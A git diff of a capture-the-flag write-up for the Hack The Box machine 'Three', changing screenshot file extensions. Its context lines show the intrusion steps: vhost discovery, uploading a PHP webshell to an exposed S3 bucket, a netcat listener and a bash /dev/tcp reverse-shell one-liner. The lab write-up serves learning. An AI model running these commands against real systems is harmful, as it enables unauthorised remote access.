@@ -44,17 +44,17 @@ zsh: segmentation fault  nmap -v -sV -sC -oA nmap/Three.nmap 10.129.126.225
 
 - Let's check the Running Website on the Target!
 
-![img01](screenshots/img01.png)
+![img01](screenshots/img01.jpg)
 
 ### Gobuster
 
-![img02](screenshots/img02.png)
+![img02](screenshots/img02.jpg)
 
 - Looks like a PHP website is running on the machine.
 
 ### Inspecting Source Code!
 
-![img03](screenshots/img04.png)
+![img03](screenshots/img04.jpg)
 
 - From the Source Code we found an Email Address.
 
@@ -67,13 +67,13 @@ Looks the the domain name could be **toppers.htb**
 
 ### Gobuster with vhosts
 
-![img05](screenshots/img05.png)
+![img05](screenshots/img05.jpg)
 
 - Found a subdomain named as **s3.thetoppers.htb**.
 
 - Checking the url on the browser:
 
-![img06](screenshots/img06.png)
+![img06](screenshots/img06.jpg)
 
 ### Getting Details with awscli
 
@@ -84,7 +84,7 @@ aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
 ```
 
 **Output**
-![img07](screenshots/img07.png)
+![img07](screenshots/img07.jpg)
 
 **Uploading our PHP webshell to the Target**
 
@@ -100,7 +100,7 @@ aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
 
 - Checking if our Web-Shell is working fine by runing **id** command:
 
-![img08](screenshots/img11.png)
+![img08](screenshots/img11.jpg)
 
 **Serving a http server from our local machine to upload our reverse shell**
 
@@ -118,10 +118,10 @@ nc -lvnp 1234
 ```
 bash -i >& /dev/tcp/[ip-address]/1234 0>&1
 ```
-![img09](screenshots/img08.png)
+![img09](screenshots/img08.jpg)
 
 - On Netcat we instantly get the connection like this:
-![img10](screenshots/img10.png)
+![img10](screenshots/img10.jpg)
 
 **DONE**
 
